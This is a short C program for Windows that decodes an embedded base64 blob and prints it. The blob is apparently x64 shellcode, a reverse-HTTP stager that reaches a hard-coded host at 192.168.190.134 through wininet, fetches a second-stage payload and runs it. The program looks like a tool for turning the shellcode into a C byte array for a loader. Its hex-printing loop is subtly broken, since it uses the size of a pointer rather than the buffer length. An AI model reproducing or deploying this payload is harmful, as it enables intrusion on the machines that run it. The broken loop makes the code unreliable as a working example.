#include <windows.h>
#include <stdio.h>
#include <wincrypt.h>

#pragma comment(lib, "Crypt32.lib")


int main() {
	

	const char* base64 = "/EiD5PDozAAAAEFRQVBSSDHSZUiLUmBIi1IYSItSIFFWSA+3SkpIi3JQTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJIi1Igi0I8QVFIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ESLQCBJAdCLSBhQ41ZI/8lBizSITTHJSAHWSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEFYQVhIAdBeWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11IMdtTSb53aW5pbmV0AEFWSInhScfCTHcmB//VU1PocAAAAE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC4wLjAgU2FmYXJpLzUzNy4zNgBZU1pNMcBNMclTU0m6OlZ5pwAAAAD/1egQAAAAMTkyLjE2OC4xOTAuMTM0AFpIicFJx8BQAAAATTHJU1NqA1NJuleJn8YAAAAA/9XoSwAAAC91d0RpWVJOcmNtek83TV91cHNBQlB3al9sbmlrNDg3X0dhQjJTTXRlMWxqWGZEUHQ5OUZidFFBWDVxVmIxUmlBVEpPbnF2eHUtAEiJwVNaQVhNMclTSLgAAiiEAAAAAFBTU0nHwutVLjv/1UiJxmoKX1NaSInxTTHJTTHJU1NJx8ItBhh7/9WFwHUfSMfBiBMAAEm6RPA14AAAAAD/1Uj/z3QC68zoVQAAAFNZakBaSYnRweIQScfAABAAAEm6WKRT5QAAAAD/1UiTU1NIiedIifFIidpJx8AAIAAASYn5SboSloniAAAAAP/VSIPEIIXAdLJmiwdIAcOFwHXSWMNYagBZScfC8LWiVv/V";


    DWORD shellcodeLen = 0;

    // First, get required buffer size
    CryptStringToBinaryA(base64, 0, CRYPT_STRING_BASE64, NULL, &shellcodeLen, NULL, NULL);

    BYTE* shellcode = (BYTE*)malloc(shellcodeLen);
    if (!shellcode) {
        fprintf(stderr, "Memory allocation failed.\n");
        return 1;
    }

    if (CryptStringToBinaryA(base64, 0, CRYPT_STRING_BASE64, shellcode, &shellcodeLen, NULL, NULL)) {
        printf("shellcode (%lu bytes):\n", shellcodeLen);
        fwrite(shellcode, 1, shellcodeLen, stdout);
        printf("\n");
    } else {
        fprintf(stderr, "Decoding failed. Error code: %lu\n", GetLastError());
    }


    int idx = 0;
	while ( idx < sizeof(shellcode))
	{
		if (idx == (sizeof(shellcode) - 1) )
		{
			printf("0x%02x ", (unsigned char)shellcode[idx]);
		}
		else
		{
			printf("0x%02x, ", (unsigned char)shellcode[idx]);
		}
		idx++;
	}
	

    free(shellcode);
    return 0;
}
